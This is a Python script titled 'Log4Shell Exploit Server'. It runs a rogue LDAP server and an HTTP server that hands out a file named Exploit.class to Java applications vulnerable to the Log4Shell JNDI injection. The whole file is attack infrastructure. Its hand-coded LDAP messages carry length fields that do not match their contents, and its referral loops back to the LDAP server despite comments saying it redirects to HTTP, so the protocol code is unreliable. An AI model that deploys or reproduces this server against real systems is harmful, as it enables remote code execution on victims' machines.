import socket
import threading
import http.server
import socketserver
import os
import struct

class Log4ShellExploitServer:
    def __init__(self, ldap_port=1389, http_port=8888):
        self.ldap_port = ldap_port
        self.http_port = http_port
        self.exploit_class_path = 'Exploit.class'

    def handle_ldap_connection(self, conn, addr):
        """Handle incoming LDAP connections and redirect to HTTP server"""
        try:
            print(f"[LDAP] Connection from {addr[0]}:{addr[1]}")

            # Read the LDAP bind request
            data = conn.recv(8192)
            print(f"[LDAP] Received {len(data)} bytes")

            # Send LDAP SearchResult with javaCodeBase pointing to our HTTP server
            # This tells Java to download the class from our HTTP server
            http_url = f"http://localhost:{self.http_port}/"

            # LDAP SearchResultEntry with javaFactory
            response = bytearray([
                0x30, 0x0c,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID: 2
                0x64, 0x07,  # SearchResultEntry
                0x04, 0x00,  # objectName: ""
                0x30, 0x03,  # attributes: SEQUENCE
                0x30, 0x01,  # SEQUENCE
                0x04, 0x00   # type: ""
            ])

            # Send initial response
            conn.send(bytes(response))

            # Send LDAP Result with referral
            result = bytearray([
                0x30, 0x49,  # SEQUENCE
                0x02, 0x01, 0x02,  # messageID: 2
                0x65, 0x44,  # SearchResultDone
                0x0a, 0x01, 0x0a,  # resultCode: referral(10)
                0x04, 0x00,  # matchedDN: ""
                0x04, 0x00,  # diagnosticMessage: ""
                0xa3, 0x3b,  # referral
                0x04, 0x39   # URI
            ])

            # Add the HTTP URL as referral
            referral = f"ldap://localhost:{self.ldap_port}/Exploit".encode()
            result.extend(referral)

            conn.send(bytes(result))
            print(f"[LDAP] Sent referral to HTTP server")

        except Exception as e:
            print(f"[LDAP] Error handling connection: {e}")
        finally:
            conn.close()

    def start_ldap_server(self):
        """Start the LDAP server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.ldap_port))
        server.listen(5)
        print(f"[+] LDAP server listening on 0.0.0.0:{self.ldap_port}")

        while True:
            conn, addr = server.accept()
            thread = threading.Thread(target=self.handle_ldap_connection, args=(conn, addr))
            thread.daemon = True
            thread.start()

    def start_http_server(self):
        """Start HTTP server to serve the exploit class"""
        os.chdir(os.path.dirname(os.path.abspath(__file__)) or '.')

        class ExploitHTTPHandler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                print(f"[HTTP] {self.client_address[0]} requested: {self.path}")

                if 'Exploit.class' in self.path or self.path == '/':
                    try:
                        with open('Exploit.class', 'rb') as f:
                            exploit_data = f.read()

                        self.send_response(200)
                        self.send_header('Content-Type', 'application/octet-stream')
                        self.send_header('Content-Length', str(len(exploit_data)))
                        self.end_headers()
                        self.wfile.write(exploit_data)
                        print(f"[+] Served Exploit.class ({len(exploit_data)} bytes)")
                    except FileNotFoundError:
                        print("[!] Exploit.class not found")
                        self.send_error(404, "Exploit.class not found")
                else:
                    super().do_GET()

            def log_message(self, format, *args):
                # Suppress default logging
                pass

        with socketserver.TCPServer(('', self.http_port), ExploitHTTPHandler) as httpd:
            print(f"[+] HTTP server listening on 0.0.0.0:{self.http_port}")
            httpd.serve_forever()

    def run(self):
        """Start both LDAP and HTTP servers"""
        # Start LDAP server in a thread
        ldap_thread = threading.Thread(target=self.start_ldap_server)
        ldap_thread.daemon = True
        ldap_thread.start()

        # Start HTTP server in main thread
        try:
            self.start_http_server()
        except KeyboardInterrupt:
            print("\n[*] Shutting down servers...")

if __name__ == "__main__":
    print("=" * 60)
    print("Log4Shell Exploit Server")
    print("=" * 60)
    server = Log4ShellExploitServer()
    server.run()